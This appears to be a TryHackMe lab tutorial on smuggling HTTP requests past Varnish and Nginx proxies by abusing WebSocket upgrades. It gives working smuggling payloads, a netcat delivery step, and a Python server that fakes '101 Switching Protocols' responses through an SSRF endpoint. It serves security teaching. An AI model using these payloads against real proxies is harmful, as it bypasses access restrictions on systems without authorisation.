In this room, we'll look at ways to smuggle requests through proxies by abusing WebSockets.Â 

Learning Objectives

- Understand how WebSockets work.
- Learn how to exploitÂ HTTPÂ request smuggling via WebSockets functionality.
- Use tools to detect/exploit said vulnerabilities.

Room Prerequisites

Before attempting this room, you must complete theÂ [HTTPÂ Request Smuggling](https://tryhackme.com/room/httprequestsmuggling)Â room. You must also be comfortable using proxies like Burp orÂ ZAP.

# WebSockets
---

###  What is a WebSocket?

When usingÂ HTTP, the client must make a request before the server can send any information. This complicates the implementation of some application features that require bidirectional communications. For example, suppose you are implementing a web application that needs to send real-time notifications to the user. Since the server can't push information to the user at will, the client would need to constantly poll the server for notifications, requiring lots of wasted requests.

The WebSocket protocol allows the creation of two-way communication channels between a browser and a server by establishing a long-lasting connection that can be used for full-duplex communications.

### UpgradingÂ HTTPÂ connections to Websockets

The WebSocket protocol was designed to be fully compatible withÂ HTTP. Establishing a WebSocket connection follows a process similar to that of h2c (see theÂ [HTTP/2 request smuggling](https://tryhackme.com/room/http2requestsmuggling)Â room for details). The client sends an initialÂ HTTPÂ request with anÂ `Upgrade: websocket`Â header and other additional headers. If the server supports WebSockets, it responds with aÂ `101 Switching Protocols`Â response and upgrades the connection accordingly. From that point onwards, the connection uses the WebSocket protocol instead ofÂ HTTP.

If we now add aÂ proxyÂ in the middle, something interesting happens: Instead of fronting the connections themselves, most proxies won't handle the upgrade but will instead relay them to the backend server. Once the connection is upgraded, theÂ proxyÂ will establish a tunnel between the client and server, so any further WebSocket traffic is forwarded without interruptions.

![WebSocket upgrade through a proxy](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/8d1983da6c30092b558ea2c724c00ddb.svg)  

The problem we now face is that the tunnel uses the WebSocket protocol instead ofÂ HTTP. If we were to attempt to smuggle anÂ HTTPÂ request using this tunnel, the backend server would reject it as it expects WebSocket requests.

# Abusing Websockets for Request Smuggling

### SmugglingÂ HTTPÂ requests through broken WebSocket Tunnels  

To smuggle requests through a vulnerableÂ proxy, we can create a malformed request such that theÂ proxyÂ thinks a WebSocket upgrade is performed, but the backend server doesn't really upgrade the connection. This will force theÂ proxyÂ into establishing a tunnel between client and server that will go unchecked since it assumes it is now a WebSocket connection, but the backend will still expectÂ HTTPÂ traffic.

One way to force this is to send an upgrade request with an invalidÂ `Sec-Websocket-Version`Â header. This header is used to specify the version of the WebSocket protocol to use and will normally take the value ofÂ `13`Â in most current WebSocket implementations. If the server supports the requested version, it should issue aÂ `101 Switching Protocols`Â response and upgrade the connection.

But we aren't interested in upgrading the connection. If we send an unsupported value for theÂ `Sec-Websocket-Version`Â header, the server will send aÂ `426 Upgrade Required`Â response to indicate the upgrade was unsuccessful:

![Websocket upgrade with invalid version number](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/7d307664d2f79553e2843c032caf4677.svg)  

Some proxies may assume that the upgrade is always completed, regardless of the server response. This can be abused to smuggle HTTP requests once again by performing the following steps:

1. The client sends a WebSocket upgrade request with anÂ **invalid**Â version number.
2. The proxy forwards the request to the backend server.
3. The backend server responds withÂ `426 Upgrade Required`. The connection doesn't upgrade, so the backend remains usingÂ HTTPÂ instead of switching to a WebSocket connection.
4. TheÂ proxyÂ doesn't check the server response and assumes the upgrade was successful. Any further communications will be tunnelled since theÂ proxyÂ believes they are part of an upgraded WebSocket connection.

![Tricking the proxy by using an invalid WebSocket version number](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/912ae5a26d8b060d71524216b0b0db2b.svg)  

It is important to note that this technique won't allow us to poison other users' backend connections. We will be limited to tunnelling requests through theÂ proxyÂ only, so we can bypass any restrictions imposed by the frontendÂ proxyÂ by using this trick.

BypassingÂ ProxyÂ Restrictions

Let's check the application atÂ `http://10.10.235.194:8001/flag`. This application is running behind aÂ **Varnish**Â proxy with a vulnerable configuration.Â Our objective in this application is to retrieve the value stored inÂ `/flag`.

As a first attempt, if we try to accessÂ `/flag`Â directly, we are presented with the following message:

![Flag is denied by the proxy](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/d1e45e8a4802ccaa8026c1dc15ffe6ec.png)  

This error message was sent by Varnish (the proxy) instead of the backend application, which should be interesting. If we try accessing another non-existent resource likeÂ `http://10.10.235.194:8001/nonexistent134`,Â the error message presented will be different. At this point, we should be suspicious that the frontendÂ proxyÂ is restricting access toÂ `/flag`Â in the backend web server.

Luckily, there's also a WebSocket endpoint we can abuse atÂ `http://10.10.235.194:8001/socket`. Let's send the following payload to try to smuggle a request for the flag inside a broken WebSocket connection:

```shell
GET /socket HTTP/1.1
Host: 10.10.235.194:8001
Sec-WebSocket-Version: 777
Upgrade: WebSocket
Connection: Upgrade
Sec-WebSocket-Key: nf6dB8Pb/BLinZ7UexUXHg==

GET /flag HTTP/1.1
Host: 10.10.235.194:8001

```

To send the request, we will use Burp's Repeater. To ensure Burp doesn't modify our request and break the attack, we need to make sure theÂ `Update Content-Length`Â setting is disabled:

![Disabling Update Content-Length setting in Burp](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/bb84fd50d49bd7c3e88397abcc0def9d.png)  

Once this is done, we can send our payload and should get the flag (note the two newlines at the end of the payload):

![Smuggling a request through WebSockets](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/b1cf9c5f2251c60723a005819bcd36be.png)  

Just as expected, we get aÂ `426`Â error from the initial attempt to upgrade the connection to a WebSocket. At this point, the proxy believes the rest of the connection uses the WebSocket protocol and will tunnel everything directly to the backend server, including our smuggled request forÂ `/flag`.

What if the App Doesn't Speak WebSocket?

Note that some proxies will not even require the existence of a WebSocket endpoint for this technique to work. All we need is to fool theÂ proxyÂ into believing we are establishing a connection to a WebSocket, even if this isn't true. Look at what happens if you try to send the following payload (be sure to add two newlines after the payload in Burp):

```shell
GET / HTTP/1.1
Host: 10.10.235.194:8001
Sec-WebSocket-Version: 13
Upgrade: WebSocket
Connection: Upgrade
Sec-WebSocket-Key: nf6dB8Pb/BLinZ7UexUXHg==

GET /flag HTTP/1.1
Host: 10.10.235.194:8001

```

This payload should still work, even though the first request is directed toÂ `/`, which is not a WebSocket-enabled endpoint. The proxy simply doesn't check the response from the upgrade, so you can use any payload that looks close enough to a WebSocket upgrade.

**Note:**Â This payload will randomly fail when using Burp. You can either retry the payload a couple of times until it works, or deliver it by pasting it into a terminal runningÂ `nc 10.10.235.194 8001`, where it will work every time (don't forget the trailing newlines).

### Upgrading ourÂ Proxy

So far, we've been working with aÂ proxyÂ that won't check the web server's response to determine whether the WebSocket upgrade was successful. In this task, we'll replace the vulnerable VarnishÂ proxyÂ with an NginxÂ proxyÂ that checks responses before tunnelling requests through a WebSocket connection. The backend application will still have theÂ `/socket`Â endpoint enabled with WebSockets and theÂ `/flag`Â endpoint as our target. The new application can be accessed viaÂ `http://10.10.235.194:8002/`.

First, let's try running the payload we used in the previous task to see if it works:

![Testing our payload with Nginx as a proxy](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/ac9a19fb3a5fe25154482cf7c70368f6.png)  

Notice how Nginx won't leak the flag despite getting aÂ `426`Â response for the initial WebSocket upgrade attempt. Since Nginx is checking the response code of the upgrade, it can determine that no valid WebSocket connection was established; therefore, it won't allow us to smuggle theÂ `/flag`Â request.

You are free to try the second payload presented in the previous task, but you should obtain similar results.

### Tricking the Proxy

Since we can't just smuggle requests anymore, we need to find a way to trick the proxy into believing a valid WebSocket connection has been established. This means we need to somehow force the backend web server to reply to our upgrade request with a fakeÂ `101 Switching Protocols`Â response without actually upgrading the connection in the backend.

While we won't be able to do this for all applications, if our target app has some vulnerability that allows us toÂ proxyÂ requests back to a server we control as attackers, we might be able to inject theÂ `101 Switching Protocols`Â response to an arbitrary request. In these special cases, we should be able to smuggle requests through a fake WebSocket connection again.

![Faking a websocket by leveraging SSRF](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/3b58631ce8959364520fa9515f5aa49a.svg)  

Leveraging SSRF

In this task's application, we will take advantage of an SSRF vulnerability to simulate a fake WebSocket upgrade. After a quick inspection, we can see that the application allows us to test the status of a URL. Each time we input a URL, the server will make a request toÂ `http://10.10.235.194:8002/check-url?server=<url>`Â and return the status code from the corresponding response:

![Taking advantage of SSRF](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/bbbb7b538ac6d66f6da36d6a655ada9d.png)  

We can useÂ `nc`Â in our AttackBox to check if we can direct a request to ourselves. We should get a response similar to this one:



```shell-session
user@attackbox$ nc -lvp 5555
Listening on 0.0.0.0 5555
Connection received on 10.10.235.194 52988
GET /test HTTP/1.1
Host: 10.10.11.155:5555
User-Agent: python-requests/2.31.0
Accept-Encoding: gzip, deflate
Accept: */*
Connection: keep-alive
```

This means we can successfully use theÂ SSRFÂ vulnerability to influence the response of the backend server. All we need to do is spin up a web server that returns aÂ `101`Â status, allowing us to fake a WebSocket upgrade.

Setting up the Attacker's Web Server

We can quickly set up a web server that responds with status 101 to every request with the following Python code:

```python
import sys
from http.server import HTTPServer, BaseHTTPRequestHandler

if len(sys.argv)-1 != 1:
    print("""
Usage: {} 
    """.format(sys.argv[0]))
    sys.exit()

class Redirect(BaseHTTPRequestHandler):
   def do_GET(self):
       self.protocol_version = "HTTP/1.1"
       self.send_response(101)
       self.end_headers()

HTTPServer(("", int(sys.argv[1])), Redirect).serve_forever()
```

Let's save the code to a file named myserver.py in our AttackBox and run it with the following command:


```shell-session
user@attackbox$ python3 myserver.py 5555
```

This should spin up a web server on port 5555 that will reply with a 101 status code to any request.

### Faking a WebSocket

We are finally ready to launch our payload. Let's use Burp's Repeater to send a request to /check-url against our malicious server. The request should look like this:

```shell
GET /check-url?server=http://10.10.11.155:5555 HTTP/1.1
Host: 10.10.235.194:8002
Sec-WebSocket-Version: 13
Upgrade: WebSocket
Connection: Upgrade
Sec-WebSocket-Key: nf6dB8Pb/BLinZ7UexUXHg==

GET /flag HTTP/1.1
Host: 10.10.235.194:8002

```

If all goes as expected, you should get a request in your malicious web server and the flag value in Burp (note that you need to add two newlines at the end of your payload in Burp):

![Smuggling a request through a fake websocket connection](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/4c210998e9e3ff3cd2bbad3ed5d92fe7.png)  

Remember thatÂ `/check-url`Â is not a WebSocket endpoint. We are just manipulating both the request and response that theÂ proxyÂ gets to make it believe this is a real WebSocket. This means that theÂ proxyÂ will tunnel the second request in our payload as if it were part of a WebSocket connection, but the backend will just process the request asÂ HTTPÂ since there's no WebSocket in reality.
